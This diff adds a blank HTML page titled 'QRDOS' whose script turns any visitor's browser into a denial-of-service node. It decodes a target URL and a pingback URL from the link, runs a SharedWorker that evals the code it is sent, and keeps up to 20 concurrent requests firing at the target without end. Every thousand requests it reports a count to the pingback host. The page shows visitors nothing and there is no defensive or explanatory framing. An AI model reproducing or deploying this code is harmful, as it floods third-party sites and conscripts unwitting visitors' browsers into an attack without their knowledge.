@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer">
+
+    <title>QRDOS</title>
+    <script>
+        const urlParams = new URLSearchParams(document.location.search);
+        const targetUri = atob(urlParams.get("targetUri"));
+        const pingbackUri = atob(urlParams.get("pingbackUri"));
+
+        if (!targetUri) throw "targetUri";
+
+        const workerMainFn = () => {
+            onconnect = function (e) {
+                var port = e.ports[0];
+
+                port.addEventListener('message', function (e) {
+                    if (typeof e.data === "object" && typeof e.data.fn === "string") {
+                        eval(e.data.fn);
+                    }
+                });
+
+                port.start();
+            }
+        }
+
+
+        const evalMain = (targetUri, pingbackUri) => {
+
+            const maxConnections = 20;
+            let currConnections = 0;
+            let requestCountToReport = 0;
+            let totalRequestCount = 0;
+
+            function randomNumber(min, max) {
+                return Math.random() * (max - min) + min;
+            }
+
+            async function doRequest() {
+                currConnections += 1;
+                totalRequestCount += 1;
+
+                try {
+                    const response = await fetch(targetUri, {
+                        method: 'GET',
+                        referrer: ""
+                    })
+                } catch (err) {
+
+                }
+
+                currConnections -= 1;
+                requestCountToReport += 1;
+
+                checkStartNew();
+
+                if (requestCountToReport >= 1000) {
+                    let amount = requestCountToReport;
+                    requestCountToReport = 0;
+                    try {
+                        const response = await fetch(pingbackUri, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ type: "QRDOS", amount, totalRequestCount })
+                        })
+                    } catch (err) { }
+                }
+            }
+
+            function checkStartNew() {
+                if (currConnections < maxConnections) {
+                    doRequest()
+                }
+            }
+
+            setTimeout(() => {
+                setInterval(checkStartNew, 100);
+                setInterval(checkStartNew, 100);
+            }, 1000);
+        }
+
+
+        const workerMainStr = "(" + workerMainFn.toString() + ")()";
+        const workerMainBlob = new Blob([workerMainStr], { type: "text/javascript" });
+        const workerMainObj = window.URL.createObjectURL(workerMainBlob);
+        const workerMain = new SharedWorker(workerMainObj);
+
+        workerMain.port.start();
+        workerMain.port.postMessage({ fn: "(" + evalMain.toString() + ")(" + JSON.stringify(targetUri) + ", " + JSON.stringify(pingbackUri)  + ")" });
+        workerMain.port.onmessage = (e) => {
+            // ignore
+        }
+
+    </script>
+
+</head>
+
+<body>
+
+</body>
+
+</html>
